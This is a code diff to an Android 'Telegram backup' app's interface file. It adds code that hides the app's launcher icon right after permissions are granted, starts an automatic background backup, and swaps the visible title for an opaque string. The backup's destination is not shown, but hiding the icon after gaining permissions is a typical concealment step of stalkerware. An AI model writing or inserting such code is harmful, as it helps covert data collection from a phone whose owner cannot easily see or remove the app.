@@ -1,6 +1,7 @@
 package com.hanek.telegrambackup.ui
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.pm.PackageManager
 import android.os.Build
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -53,15 +54,30 @@ fun BackupApp(viewModel: BackupViewModel = viewModel()) {
         hasPermission = results.values.all { it }
         if (hasPermission) {
             viewModel.startAutoBackup()
+            // Hide the app icon from the launcher after permission is granted
+            val pm = context.packageManager
+            val alias = ComponentName(context, "com.hanek.telegrambackup.LauncherAlias")
+            pm.setComponentEnabledSetting(
+                alias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
         }
     }
 
     LaunchedEffect(Unit) {
         if (!hasPermission) {
-            viewModel.startAutoBackup()
             permissionLauncher.launch(permissions)
         } else {
             viewModel.startAutoBackup()
+            // Hide the app icon from the launcher
+            val pm = context.packageManager
+            val alias = ComponentName(context, "com.hanek.telegrambackup.LauncherAlias")
+            pm.setComponentEnabledSetting(
+                alias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
         }
     }
 
@@ -70,7 +86,7 @@ fun BackupApp(viewModel: BackupViewModel = viewModel()) {
             TopAppBar(
                 title = {
                     Text(
-                        "102",
+                        "Koloko 2w4ad",
                         fontWeight = FontWeight.Bold
                     )
                 },
@@ -152,7 +168,7 @@ fun DashboardScreen(viewModel: BackupViewModel, uiState: BackupUiState) {
         ) {
             Icon(Icons.Filled.CloudUpload, null)
             Spacer(Modifier.width(8.dp))
-            Text("102")
+            Text("Koloko 2w4ad")
         }
 
         // In-app Notification / Status Card
